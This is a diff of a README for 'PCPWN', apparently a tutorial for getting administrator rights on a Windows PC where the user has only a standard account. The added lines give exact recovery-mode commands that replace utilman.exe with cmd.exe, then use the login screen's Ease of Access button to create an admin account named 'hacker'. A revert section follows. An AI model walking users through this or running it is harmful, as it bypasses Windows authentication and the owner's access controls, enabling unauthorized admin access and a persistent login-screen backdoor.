@@ -26,66 +26,55 @@ PCPWN is an informative tutorial that guides you through the process of gaining 
 <table>
   <tr>
     <td align="center">
-      <a href="#"><img src="https://www.windowspasswordsrecovery.com/images/topic/fix-windows/repair-your-computer.jpg" width="300" /></a>
+      <a href="#"><img src="https://i.imgur.com/NNXrJrk.png" width="300" /></a>
         <br />
       </a>
     </td>
     <td align="center">
-      <a href="#"><img src="https://i.imgur.com/Hi2fqIr.png" width="300" /></a>
+      <a href="#"><img src="https://i.imgur.com/zbDdvEI.png" width="300" /></a>
         <br />
       </a>
     </td>
     <td align="center">
-     <a href="#"><img src="https://i.imgur.com/xpSfUCj.png" width="300" /></a>
+     <a href="#"><img src="https://i.imgur.com/R1Tg6vo.png" width="300" /></a>
+        <br />
+      </a>
+    </td>
+      <td align="center">
+     <a href="#"><img src="https://i.imgur.com/DwzVX1G.png" width="300" /></a>
+        <br />
+      </a>
+    </td>
+      <td align="center">
+     <a href="#"><img src="https://i.imgur.com/oDvOtPm.png" width="300" /></a>
         <br />
       </a>
     </td>
 </table>
 
-  Select "Repair Your Computer," then navigate to "Troubleshoot," and finally, select "Command Prompt."
+Search "recovery start-up" > click recovery start-up.
 
-### 2. Utilizing Command Prompt:
-    In the Command Prompt, type notepad to open the Notepad text editor.
-    select file | click save as | select this pc | select all files |
+Click Restart Now button under the Advanced start-up section. The computer should restart and enter recovery mode.
 
-<table>
-  <tr>
-    <td align="center">
-      <a href="#"><img src="https://i.imgur.com/lUC9sBN.png" width="300" /></a>
-        <br />
-      </a>
-    </td>
-    <td align="center">
-      <a href="#"><img src="https://i.imgur.com/6QUeUIC.png" width="300" /></a>
-        <br />
-      </a>
-    </td>
-</table>
+then navigate to "Troubleshoot," click "Advanced option" and finally, select "Command Prompt."
 
-### 3. Changing Utilman to CMD:
-    Navigate to drive X (replace X with the appropriate drive).
-    Go to System32 and rename cmd to utilman.
-    Exit the Command Prompt.
+### 2. Utilizing Command Prompt and Changing Utilman to CMD:
+In the Command Prompt, type the following command:
 
+    wmic logicaldisk get caption                        - List available drives
+    c:                                                  - Change to the C: drive
+    cd Windows\System32                                 - Navigate to the System32 folder
+    ren utilman.exe utilman.exe.bak                     - Rename utilman.exe to utilman.exe.bak
+    copy cmd.exe utilman.exe                            - Copy cmd.exe to utilman.exe
+    exit                                                - exit the command prompt
+    
 ### 4. Adding a User Account:
-    Return to the login screen and click on "Ease of Access Icon."
-    Type the following command: 
-    net user hacker hacker /add 
-    net localgroup Administrators hacker /add
+Return to the login screen and click on "Ease of Access Icon."
 
-<table>
-  <tr>
-    <td align="center">
-      <a href="#"><img src="https://i.imgur.com/Ebi9VG1.png" width="300" /></a>
-        <br />
-      </a>
-    </td>
-    <td align="center">
-      <a href="#"><img src="https://i.imgur.com/HiFXNMi.png" width="300" /></a>
-        <br />
-      </a>
-    </td>
-</table>
+In the Command Prompt, type the following command:
+
+    net user hacker hacker /add                         - Create a new user named "hacker" with password "hacker"
+    net localgroup Administrators hacker /add           - Add the user "hacker" to the Administrators group
 
 ### 5. Logging In with the New Account with admin priv:
     Log in with your non-administrator account.
@@ -100,6 +89,17 @@ With these admin superpowers, you can do a whole bunch of cool stuff. Need to tw
 * Windows 11
 * Windows 10
 * Windows 7
+
+
+### Reverting Changes
+To restore utilman.exe, in the Command Prompt type in:
+
+    C:
+    cd windows\system32
+    del utilman.exe
+    ren utilman.exe.bak utilman.exe
+
+Then reboot the system.
 
 ## Support
 
